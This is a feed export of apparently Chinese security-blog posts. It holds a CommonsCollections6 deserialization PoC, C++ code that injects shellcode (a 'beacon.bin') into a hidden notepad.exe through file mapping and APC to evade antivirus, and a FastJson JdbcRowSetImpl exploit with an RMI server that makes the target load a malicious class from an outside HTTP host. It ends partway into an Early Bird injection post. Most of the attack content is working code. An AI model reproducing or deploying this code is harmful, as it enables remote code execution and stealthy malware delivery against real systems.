class="hljs-comment">// ⽣成序列化字符串</span><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        <span class="hljs-comment">// 本地测试触发</span><br>        System.out.println(barr);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        Object o = (Object)ois.readObject();<br>    &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/7.png"></p><p>我们要想解决在调用<code>put</code>方法的时候就触发命令执行的问题，可以用如下<code>POC</code>：</p><p>构造<code>LazyMap</code>的时候先⽤了⼀个⼈畜⽆害的<code> fakeTransformers</code> 对象，等最后要⽣成<code>Payload</code>的时候，再利用反射将真正的<code>transformers</code>替换进去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc6OfPgod</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException </span>&#123;<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<span class="hljs-keyword">new</span><br>            ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                String.class,<br>                Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                Object.class,<br>                Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span><br>                Object[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class<br>            &#125;,<br>                <span class="hljs-keyword">new</span> String[] &#123; <span class="hljs-string">&quot;deepin-calculator&quot;</span> &#125;),<br>            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innerMap, transformerChain);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> HashMap();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);<br>        Field f =<br>            ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        f.set(transformerChain, transformers);<br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// ⽣成序列化字符串</span><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        <span class="hljs-comment">// 本地测试触发</span><br>        System.out.println(barr);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        Object object = (Object) ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/8.png"></p><h1 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5.参考链接"></a>5.参考链接</h1><p>P牛代码审计星球的《Java安全漫谈 - 12.反序列化篇(6)》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    本篇文章我并不打算直接按照&lt;code&gt;ysoserial&lt;/code&gt;中的代码进⾏讲解，原因是&lt;code&gt;ysos</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>免杀-内存注入之MappingInjection</title>
    <link href="https://reader-l.github.io/2021/04/25/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BMappingInjection/"/>
    <id>https://reader-l.github.io/2021/04/25/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BMappingInjection/</id>
    <published>2021-04-25T11:26:00.000Z</published>
    <updated>2021-04-26T03:03:54.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在一些杀软中，像<code>VirtualAlloc</code>、<code>WriteProcessMemory</code>等一些经典注入的API是重点监控关注对象，而使用内存对象映射相关函数可以避免这种情况，同时当进程内的一个线程调用一个会创建内核对象的函数时，内核将为这个对象分配并且初始化一个内存块，因此在本次实验中创建Mapping内核对象本质上属于申请一块物理内存。同时申请的物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存里。</p><h1 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h1><p>​    1.使用分离技术，将<code>shellcode</code>和加载器分离。使用内存映射读<code>shellcode</code>。</p><p>​    2.创建应用程序进程，比如<code>notepad.exe</code>。</p><p>​    3.在该进程中创建<code>Mapping</code>。</p><p>​    4.将mapping映射到注入进程虚拟地址。</p><p>​    5.往被映射的虚拟地址写入<code>shellcode</code>。</p><p>​    6.打开被注入进程句柄。</p><p>​    7.将mapping映射到被注入进程虚拟地址。</p><p>​    8.创建远程线程。</p><h1 id="3-代码实现"><a href="#3-代码实现" class="headerlink" title="3.代码实现"></a>3.代码实现</h1><p>如下代码只实现核心部分，加密混淆部分我就去除掉了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment (lib, <span class="hljs-meta-string">&quot;OneCore.lib&quot;</span>)</span><br><span class="hljs-comment">//MapViewOfFile2函数依赖这个静态链接库</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span></span>;<br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, _TCHAR* argv[])<br>&#123;<br><span class="hljs-keyword">if</span> (Help(argc) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//获取shellcode</span><br>DWORD dwread = <span class="hljs-number">0</span>;<br>HANDLE  hFile = CreateFile(argv[<span class="hljs-number">1</span>], GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>DWORD shellcode_size = GetFileSize(hFile, <span class="hljs-literal">NULL</span>);<br>LPVOID shellcode_Hmap = CreateFileMapping(hFile, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="hljs-number">0</span>, shellcode_size,<span class="hljs-literal">NULL</span>);<br>LPVOID shellcode = MapViewOfFile(shellcode_Hmap, FILE_MAP_WRITE | FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, shellcode_size);<br><br><span class="hljs-comment">// Create a 64-bit process: </span><br>STARTUPINFOA si;<br>PROCESS_INFORMATION pi;<br>HANDLE hProcess, hThread;<br>ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>ZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br><br>si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_HIDE;<br><br><br>CreateProcessA(<span class="hljs-string">&quot;C:\\windows\\system32\\notepad.exe&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE,<br>CREATE_NO_WINDOW, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><br><span class="hljs-comment">//利用内存映射往内存注入shellcode</span><br>HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="hljs-number">0</span>, shellcode_size, <span class="hljs-literal">NULL</span>);<br>LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, shellcode_size);<br><span class="hljs-built_in">memcpy</span>((PVOID)lpMapAddress, shellcode, shellcode_size);<br><br>LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, pi.hProcess, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, PAGE_EXECUTE_READ);<br><span class="hljs-comment">//利用APC函数执行线程，避开CreateRemoteThread</span><br>QueueUserAPC((PAPCFUNC)lpMapAddressRemote, pi.hThread, <span class="hljs-literal">NULL</span>);<br>ResumeThread(pi.hThread);<br>    <span class="hljs-comment">//释放句柄</span><br>CloseHandle(pi.hThread);<br>CloseHandle(hMapping);<br>    <span class="hljs-comment">//从调用进程的地址空间取消映射文件的映射视图。</span><br>UnmapViewOfFile(lpMapAddress);<br>UnmapViewOfFile(shellcode);<br>UnmapViewOfFile(lpMapAddressRemote);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Powered by reader-l\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Blog:http://reader-l.github.io\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage:MappingInjection.exe beacon.bin\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-完整程序"><a href="#4-完整程序" class="headerlink" title="4.完整程序"></a>4.完整程序</h1><p><a href="https://github.com/ReadER-L/BypassSecuritySoftware">https://github.com/ReadER-L/BypassSecuritySoftware</a></p><h1 id="5-配合加密混淆效果"><a href="#5-配合加密混淆效果" class="headerlink" title="5.配合加密混淆效果"></a>5.配合加密混淆效果</h1><p>还不错</p><p><img src="/2021/04/25/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BMappingInjection/1.png"></p><h1 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6.参考链接"></a>6.参考链接</h1><p><a href="https://blog.csdn.net/Kwansy/article/details/114062311">https://blog.csdn.net/Kwansy/article/details/114062311</a></p><p><a href="https://docs.microsoft.com/en-us/search/?terms=MapViewOfFile2&amp;category=Reference&amp;scope=Desktop">https://docs.microsoft.com/en-us/search/?terms=MapViewOfFile2&amp;category=Reference&amp;scope=Desktop</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    在一些杀软中，像&lt;code&gt;VirtualAlloc&lt;/code&gt;、&lt;code&gt;WriteProcessMemor</summary>
      
    
    
    
    <category term="免杀" scheme="https://reader-l.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-FastJson之JdbcRowSetImpl链分析</title>
    <link href="https://reader-l.github.io/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://reader-l.github.io/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2021-04-24T02:19:58.000Z</published>
    <updated>2021-04-24T12:04:26.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在<code>JdbcRowSetImpl</code>链会用到JNDI以及RMI的相关知识，这两方面的知识我都有学习过，师傅们可以看看我之前的文章。</p><h1 id="2-漏洞影响范围"><a href="#2-漏洞影响范围" class="headerlink" title="2.漏洞影响范围"></a>2.漏洞影响范围</h1><p><code>FastJson&lt;=1.2.24</code></p><h1 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="4-利用链复现"><a href="#4-利用链复现" class="headerlink" title="4.利用链复现"></a>4.利用链复现</h1><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String pocString = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/reference\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(pocString);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>RmiServer</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RmiServer</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;<br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Reference reference = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;whatever&quot;</span>,<span class="hljs-string">&quot;EvilObject&quot;</span>,<span class="hljs-string">&quot;http://192.168.199.246:4444/&quot;</span>);<br>        System.out.println(reference);<br>        ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(reference);<br>        registry.bind(<span class="hljs-string">&quot;reference&quot;</span>,referenceWrapper);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>恶意类<code>EvilObject</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EvilObject</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">EvilObject</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;deepin-calculator&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>将其编译后，放置在HTTP服务器上。</p><p>执行完POC后，可以发现成功调用了服务器上的恶意类并执行。</p><p><img src="/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/1.png"></p><h1 id="5-利用链分析"><a href="#5-利用链分析" class="headerlink" title="5.利用链分析"></a>5.利用链分析</h1><p>​    我之前跟过<code>FastJson</code>的<code>TemplatesImp</code>链，知道在<code>FastJson</code> 中有一个<code>@type</code> 参数，能将我们反序列化后的类转为<code>@type</code> 中指定的类，然后在反序列化过程中会自动调用类中的<code>setter</code> <code>getter</code> 和构造器。</p><p>找到对应的反序列化器后，就拿来处理我们的反序列化数据。</p><p><img src="/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/2.png"></p><p>之后就就像之前分析<code>TemplatesImp</code>链一样，最后用反射调用了<code>com.sun.rowset.JdbcRowSetImpl</code>的<code>setAutoCommit</code>方法：</p><p>跟进该方法：</p><p><img src="/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/3.png"></p><p>跟进<code>connect</code>方法：</p><p>​    发现利用了<code>jndi</code>，那么我们如果控制了 <code>dataSourceName</code>就可以利用 <code>JNDI</code> 注入（可以看我之前的文章）让客户端进行命令执行了，而这里<code>dataSourceName</code>恰恰可以控制，所以此处远程加载了我们HTTP服务上的恶意<code>class</code>。</p><p><img src="/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/4.png"></p><p><img src="/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/5.png"></p><h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h1><p>在分析完之后我们再来梳理一下，产生漏洞的原因，以及1.2.24 中利用方法的限制</p><ol><li><code>TemplatesImpl</code> 链 优点：当<code>fastjson</code>不出网的时候可以直接进行盲打（配合时延的命令来判断命令是否执行成功） 缺点：版本限制 1.2.22 起才有<code>SupportNonPublicField</code>特性，并且后端开发需要特定语句才能够触发，在使用<code>parseObject</code>的时候，必须要使用 <code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)</code></li><li><code>JdbcRowSetImpl </code>链的优点：利用范围更广，即触发更为容易 ；缺点：当<code>fastjson </code>不出网的话这个方法基本上也是无法使用的了，同时高版本jdk中<code>codebase</code>默认为true，这样意味着，我们只能加载受信任的地址。</li></ol><h1 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7.参考链接"></a>7.参考链接</h1><p><a href="https://www.anquanke.com/post/id/87300">https://www.anquanke.com/post/id/87300</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    在&lt;code&gt;JdbcRowSetImpl&lt;/code&gt;链会用到JNDI以及RMI的相关知识，这两方面的知识我都有</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>免杀-内存注入之Early-BIRD技术的应用</title>
    <link href="https://reader-l.github.io/2021/04/20/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BEarly-BIRD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>https://reader-l.github.io/2021/04/20/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BEarly-BIRD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2021-04-20T13:17:25.000Z</published>
    <updated>2021-04-26T03:04:05.648Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-Early-Bird简介"><a href="#1-Early-Bird简介" class="headerlink" title="1.Early Bird简介"></a>1.Early Bird简介</h1><p>​    Early Bird是一种简单而强大的技术，由于线程初始化时会调用<code>ntdll</code>未导出函数<code>NtTestAlert</code>，该函数会清空并处理<code>APC</code>队列，所以注入的代码通常在进程的主线程的入口点之前运行并接管进程控制权，从而避免了反恶意软件产品的钩子的检测，同时获得一个合法进程的环境信息。</p><p>​    挂钩是在进程开始运行时由合法的反恶意软件产品插入的代码段。它们放在特定的Windows API调用上。挂钩的目的是监视API调用及其参数，以查找恶意调用或调用模式。</p><h1 id="2-程序编写"><a href="#2-程序编写" class="headerlink" title="2.程序编写"></a>2.程序编写</h1><h2 id="1-流程如下"><a href="#1-流程如下" class="headerlink" title="1.流程如下"></a>1.流程如下</h2><ol><li>创建一个挂起的进程(通常是windows的合法进程)</li><li>在挂起的进程内申请一块可读可写可执行的内存空间</li><li>往申请的空间内写入<code>shellcode</code></li><li>将<code>APC</code>插入到该进程的主线程</li><li>恢复挂起进程的线程</li></ol><h2 id="2-相关的API"><a href="#2-相关的API" class="headerlink" title="2.相关的API"></a>2.相关的API</h2><p>创建进程API</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 